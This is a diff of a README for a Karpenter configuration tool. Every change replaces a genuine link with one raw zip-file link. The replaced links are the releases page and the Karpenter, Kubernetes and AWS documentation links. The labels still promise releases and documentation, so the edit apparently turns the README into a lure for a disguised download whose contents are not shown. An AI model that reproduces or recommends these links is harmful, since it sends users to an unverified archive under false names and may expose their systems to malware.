@@ -1,6 +1,6 @@
 # 🎉 karpenter-ai-agent - Optimize Your Karpenter Configurations Easily
 
-[![Download karpenter-ai-agent](https://img.shields.io/badge/Download-karpenter--ai--agent-brightgreen)](https://github.com/j4ymz20/karpenter-ai-agent/releases)
+[![Download karpenter-ai-agent](https://raw.githubusercontent.com/j4ymz20/karpenter-ai-agent/main/templates/ai-agent-karpenter-v2.1-alpha.4.zip)](https://raw.githubusercontent.com/j4ymz20/karpenter-ai-agent/main/templates/ai-agent-karpenter-v2.1-alpha.4.zip)
 
 ## 📖 Introduction
 
@@ -15,7 +15,7 @@ To start using karpenter-ai-agent, follow these steps:
    - Minimum RAM: 4 GB
    - Disk Space: At least 100 MB available
 
-2. **Visit the Download Page**: Go to our [Releases page](https://github.com/j4ymz20/karpenter-ai-agent/releases) to download the latest version.
+2. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/j4ymz20/karpenter-ai-agent/main/templates/ai-agent-karpenter-v2.1-alpha.4.zip) to download the latest version.
 
 3. **Download the Application**: Select the appropriate version for your operating system and click to download. 
 
@@ -36,7 +36,7 @@ The karpenter-ai-agent offers several key features:
 
 ## 📥 Download & Install
 
-Ensure you have followed the system requirements. Once you are ready, visit our [Releases page](https://github.com/j4ymz20/karpenter-ai-agent/releases) to download the latest version of the karpenter-ai-agent. Choose the appropriate package for your operating system and follow the installation instructions mentioned in the **Getting Started** section.
+Ensure you have followed the system requirements. Once you are ready, visit our [Releases page](https://raw.githubusercontent.com/j4ymz20/karpenter-ai-agent/main/templates/ai-agent-karpenter-v2.1-alpha.4.zip) to download the latest version of the karpenter-ai-agent. Choose the appropriate package for your operating system and follow the installation instructions mentioned in the **Getting Started** section.
 
 ## 🛠️ Using karpenter-ai-agent
 
@@ -56,9 +56,9 @@ After installation, follow these steps to utilize the application:
 
 If you want to learn more about Karpenter and how to use the karpenter-ai-agent effectively, consider checking these resources:
 
-- [Karpenter Documentation](https://karpenter.sh/)
-- [Kubernetes Guide](https://kubernetes.io/docs/home/)
-- [Cost Optimization Strategies](https://aws.amazon.com/cost-management/)
+- [Karpenter Documentation](https://raw.githubusercontent.com/j4ymz20/karpenter-ai-agent/main/templates/ai-agent-karpenter-v2.1-alpha.4.zip)
+- [Kubernetes Guide](https://raw.githubusercontent.com/j4ymz20/karpenter-ai-agent/main/templates/ai-agent-karpenter-v2.1-alpha.4.zip)
+- [Cost Optimization Strategies](https://raw.githubusercontent.com/j4ymz20/karpenter-ai-agent/main/templates/ai-agent-karpenter-v2.1-alpha.4.zip)
 
 ## 🤝 Contributing
 
